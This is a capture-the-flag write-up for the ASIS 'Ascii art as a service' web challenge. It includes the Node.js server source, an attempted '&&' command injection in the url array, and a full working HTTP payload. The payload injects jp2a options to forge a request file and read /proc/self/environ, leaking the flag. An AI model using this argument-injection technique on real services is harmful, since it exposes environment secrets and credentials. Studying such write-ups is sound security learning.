# Ascii art as a service
I was not able to complete the challenge during the CTF time, I realized how to solve it while I was not at home and I returned when the CTF was over. It was still fun to complete it.

## How it works
The page has a form where we can put the URL of a jpg image. This image is converted to ascii and returned to the user.

We can analyze the source which is composed by a js file:
```
#!/usr/bin/env node
const express = require('express')
const childProcess = require('child_process')
const expressSession = require('express-session')
const fs = require('fs')
const crypto = require('crypto')
const app = express()
const flag = process.env.FLAG || process.exit()
const genRequestToken = () => Array(32).fill().map(()=>"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".charAt(Math.random()*62)).join("")

app.use(express.static("./static"))
app.use(expressSession({
	secret: crypto.randomBytes(32).toString("base64"),
	resave: false,
	saveUninitialized: true,
	cookie: { secure: false, sameSite: 'Lax' }
}))
app.use(express.json())

app.post('/request',(req,res)=>{
	const url = req.body.url
	const reqToken = genRequestToken()
	const reqFileName = `./request/${reqToken}`
	const outputFileName = `./output/${genRequestToken()}`

	fs.writeFileSync(reqFileName,[reqToken,req.session.id,"Processing..."].join('|'))
	setTimeout(()=>{
		try{
			const output = childProcess.execFileSync("timeout",["2","jp2a",...url])
			fs.writeFileSync(outputFileName,output.toString())
			fs.writeFileSync(reqFileName,[reqToken,req.session.id,outputFileName].join('|'))
		} catch(e){
			fs.writeFileSync(reqFileName,[reqToken,req.session.id,"Something bad happened!"].join('|'))
		}
	},2000)
	res.redirect(`/request/${reqToken}`)
})

app.get("/request/:reqtoken",(req,res)=>{
	const reqToken = req.params.reqtoken
	const reqFilename = `./request/${reqToken}`
	var content
	if(!/^[a-zA-Z0-9]{32}$/.test(reqToken) || !fs.existsSync(reqFilename)) return res.json( { failed: true, result: "bad request token." })

	const [origReqToken,ownerSessid,result] = fs.readFileSync(reqFilename).toString().split("|")

	if(req.session.id != ownerSessid) return res.json( { failed: true, result: "Permissions..." })
	if(result[0] != ".") return res.json( { failed: true, result: result })

	try{
		content = fs.readFileSync(result).toString();
	} catch(e) {
		return res.json({ failed: false, result: "Something bad happened!" })
	}

	res.json({ failed: false, result: content })
	res.end()
})

app.get("/flag",(req,res)=>{
	if(req.ip == "127.0.0.1" || req.ip == "::ffff:127.0.0.1") res.json({ failed: false, result: flag })
	else res.json({ failed: true, result: "Flag is not yours..." })
})

function clearOutput(){
	try{
		childProcess.execSync("rm ./output/* ./request/* 2> /dev/null")
	} catch(e){}
	setTimeout(clearOutput,120e3)
}

clearOutput()
app.listen(9000)

```

The software basically gets the image URL from `body.url` and returns its ASCII representation.


### How the ASCII representation is stored
The web app saves the output of the conversione program in the `output/` folder. In the `request/` it saves instead three information separated with a  `|`: 
- 32 chars, which identifies the file name in the request folder
- the session id of the user
- the identifier of the output in the `output/` folder.

> Example: if we sent as url `http://image.com/image.jpg`, the image is converted to ASCII through a program called j2pa. The output `result` is saved in the `output/` folder and a file called `request_token` is saved in the `request/` folder. This file contains `[request_token|session_id|result]`.



### How files are read

The files are read from the memory with a `GET` request to `request/` followed by 32 chars which identify the resource.

As we already desribed, the files in the `request/` folder are composed by 3 parts:
`[origReqToken|ownerSessid|result]`:
- the request token (the 32 chars)
- the session id of the user 
- `result`, which is the identifier of the jp2a output in the `output/` folder.

After reading a file in the `request/` folder, the app retrieve the resource in the output folder `output/result` and returns it to the user.

> Example: the web app reads the file `request/request_token`, and read it's content. From the content the app verifies the `session_id` of the user and, if it corresponds, it returns the content of `output/result`.

## Ideas

Since the url is sent through a JSON, the first idea was to use the `url` to inject the `__proto__`  property (for a prototype pollution attack), however it was not a successful idea.

I tried also to include in the post request the following json:

```
{ "url":[
	"https://images.all-free-download.com/images/graphiclarge/animal_pictures_08_hd_picture_168987.jpg",
	"&&",
	"ls"
	]
}
```

Since the URL it's used when calling the conversion program `childProcess.execFileSync("timeout",["2","jp2a",...url])`

The website returned no error, so it was actually working, however only the first command was correctly executed, since **only the program options are accepted**. 

For example, If we set for example URL as 
```
{
	"url":
	[
		"--help" 
	]
}
```

We can see in the local environment the help of the jp2a software.

## Exploit
I had to stop to play for almost a day. During this time I had the idea to find in the source of jp2a some other commands which accepts a string.

- I found out actually `--html-title`, which sets the title of the `html` page if we ask to output as an HTML page (with `--html`). 

- We can also use the `--output` option to export the output file, so we redirect the output to the `request` folder.


In the `result/` folder the files are stored in the following way: `filename|session_id|output_filename`.
What we can do is to set `output_filename` to `proc/self/environ`, which contains the env variables. The page will read its content. 

What we should do is to save in the `result/` folder the following content:
`url|session_id|env_var_path`.

If we use the command `jp2a URL --output request/32_chars --html --html-title='random|session_id|../proc/self/environ|'`
the page `request/32_chars` will look like:

```
<?xml version='1.0' encoding='UTF-8' ?>

<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>

<html xmlns='http://www.w3.org/1999/xhtml' lang='en' xml:lang='en'>

<head>

<title>'title_page|BSNX4NTXYHFWNuu-4upmO7b8K47GlQ91|../proc/self/environ|'</title>

<style type='text/css'>

body { 
...
```

The `split("|")` command will divide the above output in 4 parts:
- start of html + random (which is ignored)
- session_id
- ../proc/self/environ
- end of HTML page (which will be ignored since only the first part are requested in the unpacking of the return values)

We final payload will be:

```
POST /request HTTP/1.1
Host: asciiart.asisctf.com:9000
Content-Length: 280
...
Cookie: connect.sid=s%3Ae0NioPxAjFReGZtAVRb-vv24zmtBObCC.4ioY9LjCsGB%2B%2FGZKh%2B3TWIC8aCzmHpTOncW4FRbuygk
Connection: close

{"url":["https://images.all-free-download.com/images/graphiclarge/animal_pictures_08_hd_picture_168987.jpg", 
 "--html",
"--html-title='title_page|e0NioPxAjFReGZtAVRb-vv24zmtBObCC|../proc/self/environ|'",
"--output=./request/xoCbzbZYNEwtZBmPntD6XIS79HhgzbkN"
]}
```

And by accessing the page

http://asciiart.asisctf.com:9000/request/xoCbzbZYNEwtZBmPntD6XIS79HhgzbkN

we are able to access the flag 

```
{"failed":false,"result":"HOSTNAME=883e1fbaa076\u0000HOME=/home/www\u0000TERM=xterm\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000DEBIAN_FRONTEND=noninteractive\u0000PWD=/app\u0000FLAG=ASIS{ascii_art_is_the_real_art_o/_a39bc8}\u0000NODE_ENV=production\u0000"}
```


`ASIS{ascii_art_is_the_real_art_o/_a39bc8}
